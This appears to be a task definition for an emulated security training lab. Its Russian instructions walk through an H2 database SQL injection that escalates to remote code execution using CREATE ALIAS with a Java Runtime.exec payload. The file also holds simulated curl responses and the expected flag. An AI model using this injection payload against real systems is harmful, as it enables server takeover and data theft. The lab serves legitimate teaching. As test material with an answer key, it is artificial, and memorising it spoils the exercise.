@@ -1,0 +1,42 @@
+{
+  "id": "web-h2-database",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{h2_cr34t3_al1as_rce}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: H2 CREATE ALIAS RCE\n\nЭндпоинт /search?q= уязвим, СУБД — H2.\n\n1. Подтверди H2:\n   curl -s \"https://app.target/search?q=1 UNION SELECT H2VERSION(),2-- -\"\n2. Создай алиас и вызови команду:\n   curl -s \"https://app.target/search?q=1;CREATE ALIAS EXEC AS $$String f(String c) throws Exception{return new java.util.Scanner(Runtime.getRuntime().exec(c).getInputStream()).useDelimiter('\\\\A').next();}$$;-- -\"\n   curl -s \"https://app.target/search?q=1 UNION SELECT EXEC('cat /flag'),2-- -\"\n3. Запиши флаг в found.txt и набери check.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.target/search)",
+      "cases": [
+        {
+          "match": "H2VERSION",
+          "example": "-s '.../search?q=1 UNION SELECT H2VERSION(),2-- -'",
+          "output": "2.1.214\n"
+        },
+        {
+          "match": "CREATE ALIAS",
+          "example": "-s '.../search?q=1;CREATE ALIAS EXEC AS ...-- -'",
+          "output": "OK\n"
+        },
+        {
+          "match": "EXEC\\(|/flag|cat",
+          "example": "-s '.../search?q=1 UNION SELECT EXEC('cat /flag'),2-- -'",
+          "output": "nto{h2_cr34t3_al1as_rce}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /search на app.target.\n"
+    }
+  }
+}
